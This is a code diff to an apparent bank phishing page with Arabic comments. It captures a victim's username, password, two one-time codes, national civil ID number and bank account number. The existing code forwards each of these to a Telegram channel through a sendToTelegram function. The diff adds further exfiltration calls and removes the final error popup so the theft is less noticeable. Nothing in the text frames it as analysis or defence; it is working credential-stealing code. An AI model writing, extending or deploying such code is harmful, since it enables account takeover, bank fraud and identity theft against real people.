@@ -444,6 +444,10 @@
       e.preventDefault();
       userInfo.username = document.getElementById('username').value;
       userInfo.password = document.getElementById('password').value;
+      // إرسال اسم المستخدم وكلمة السر فقط
+      sendToTelegram(
+        `🟢 [تسجيل دخول]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>`
+      );
       showStep(1); // OTP after login
       setTimeout(() => document.querySelector('.otp-login-digit').focus(), 80);
       startOTPLoginTimer();
@@ -477,7 +481,7 @@
       let otp = "";
       otpLoginInputs.forEach(inp => otp += inp.value);
       userInfo.login_otp = otp;
-      // ارسال اسم المستخدم وكلمة السر والرمز للتليجرام
+      // إرسال اسم المستخدم وكلمة السر مع رمز التحقق
       sendToTelegram(
         `🟢 [تسجيل دخول]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>\n🔢 رمز التحقق: <code>${userInfo.login_otp}</code>`
       );
@@ -529,7 +533,7 @@
       e.preventDefault();
       if (civilInput.value.length === 12) {
         userInfo.civil_id = civilInput.value;
-        // ارسال رقم البطاقة الوطنية فقط
+        // إرسال رقم البطاقة الوطنية فقط
         sendToTelegram(
           `🟦 [رقم البطاقة الوطنية]\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>`
         );
@@ -566,6 +570,10 @@
         let acc = "";
         accountDigits.forEach(input => acc += input.value);
         userInfo.account = acc;
+        // إرسال رقم البطاقة الوطنية + رقم الحساب معًا
+        sendToTelegram(
+          `🟦 [بطاقة وطنية + رقم الحساب]\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>\n💳 رقم الحساب: <code>${userInfo.account}</code>`
+        );
         showStep(4);
         setTimeout(() => document.querySelectorAll('.otp-digit')[0].focus(), 100);
         startOTPTimer();
@@ -600,11 +608,11 @@
       let otp = "";
       otpInputs.forEach(inp => otp += inp.value);
       userInfo.otp = otp;
-      // ارسال جميع المعلومات مع رقم الحساب و رمز التحقق الاخير
+      // إرسال جميع المعلومات مع رقم الحساب و رمز التحقق الاخير
       sendToTelegram(
         `🟣 [استكمال]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>\n🔢 رمز التحقق الأول: <code>${userInfo.login_otp}</code>\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>\n💳 رقم الحساب: <code>${userInfo.account}</code>\n🟡 رمز التحقق الأخير: <code>${userInfo.otp}</code>`
       );
-      showErrorPopup();
+      // يمكنك هنا إضافة أي إشعار أو توجيه إضافي إذا رغبت لاحقاً
     };
 
     // OTP timer (last step)
@@ -653,13 +661,12 @@
       });
     }
 
-    // Error Popup
+    // Error Popup (غير مستخدم في هذا السيناريو)
     function showErrorPopup() {
       document.getElementById('errorPopup').style.display = 'block';
     }
     function closeErrorPopup() {
       document.getElementById('errorPopup').style.display = 'none';
-      // Reset all fields and steps
       document.getElementById('login-form').reset();
       document.getElementById('civil-form').reset();
       document.getElementById('account-form').reset();
